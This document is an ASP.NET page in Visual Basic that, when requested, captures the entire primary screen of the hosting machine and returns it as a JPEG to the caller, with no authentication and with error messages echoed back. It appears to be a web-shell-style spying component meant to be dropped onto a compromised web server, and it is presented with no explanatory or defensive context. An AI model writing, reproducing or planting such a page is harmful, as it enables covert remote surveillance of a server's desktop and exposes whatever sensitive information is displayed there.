<%@page language="VB" buffer="false" %>
<%
                                        	     Try
                                        		     Dim r As System.Drawing.Rectangle = System.Windows.Forms.Screen.PrimaryScreen.Bounds
                                        		     Dim bmp As New System.Drawing.Bitmap(r.Width, r.Height, Drawing.Imaging.PixelFormat.Format24bppRgb)
                                        		     Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(bmp)
                                        		     g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy
                                        		     g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality
                                        		     'g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic
                                        		     g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality
                                        		     g.CopyFromScreen(0, 0, 0, 0, bmp.Size, System.Drawing.CopyPixelOperation.SourceCopy)
                                        		     g.Flush()
                                        		     g.Dispose()
                                        		     Response.ContentType = "image/jpeg"
                                        		     Dim f As System.Drawing.Imaging.ImageFormat = System.Drawing.Imaging.ImageFormat.Jpeg
                                        		     bmp.Save(Response.OutputStream, f)
                                        		     bmp.Dispose()
                                        	     Catch ex As Exception
%>error:<%=ex.Message%><%
                                        	     End Try
%>
